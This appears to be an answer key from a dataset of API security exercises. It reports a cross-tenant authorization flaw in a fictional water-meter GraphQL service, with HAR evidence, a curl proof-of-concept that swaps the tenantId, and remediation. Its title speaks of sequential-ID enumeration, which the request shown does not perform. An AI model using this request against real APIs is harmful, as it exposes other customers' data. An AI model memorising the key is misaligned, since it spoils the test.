# Expected Response

## System
- Domain: Water Utilities / Smart Meters
- System: AquaGrid Meter Management
- Example ID: GQL-0139

## Priority Findings

### Finding 1: Water Utility — Predictable/Sequential Meter IDs Enable Cross-Tenant Data Access (Pattern 1.8)
**Severity:** High
**Category:** BOLA / Predictable or Sequential IDs

**Summary:**
Per §5.0 (Pattern 1.8 — predictable or sequential IDs): Water meter IDs follow a predictable numeric pattern enabling enumeration. The `listResources` resolver trusts the client-supplied `tenantId` filter, allowing an attacker from `tenant-60ce` to pass `tenantId: "tenant-0ef3"` and receive smart meter data belonging to `tenant-0ef3`, including `CONFIDENTIAL-60ce0ef3`. In Water Utilities, unauthorized access to meter data exposes consumption records, billing information, and infrastructure state for critical public utility infrastructure.

**Evidence from HAR:**
- Request: `POST https://api.aquagrid-meter-manag.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-60ce`
- Query: `listResources(tenantId: "tenant-0ef3") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-0ef3"`, `ownerId: "other-user-60ce0ef3"`, `sensitiveField: "CONFIDENTIAL-60ce0ef3"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-60ce0ef3`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.8 | Predictable IDs enable enumeration |
| HAR request | tenantId argument | tenant-0ef3 (victim, client-supplied) |
| HAR response | tenantId | tenant-0ef3 meter data returned |
| HAR response | sensitiveField | CONFIDENTIAL-60ce0ef3 |

## Steps to Reproduce

### Step 1 — listResources with sequential meter ID enumeration (HAR)
```bash
curl -s -X POST https://api.aquagrid-meter-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-60ce" \
  -d '{"query": "query { listResources(tenantId: \"tenant-0ef3\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-0ef3` meter data returned. **Secure:** Only `tenant-60ce` data or FORBIDDEN.

## Remediation
1. Use UUID v4 (non-sequential) for meter IDs.
2. Remove `tenantId` arg; derive from `$jwt.tenantId` only.
3. Resolver: `WHERE tenant_id = $jwt.tenantId`.
4. Redis cache key: `meter:{tenantId}:{meterId}`.
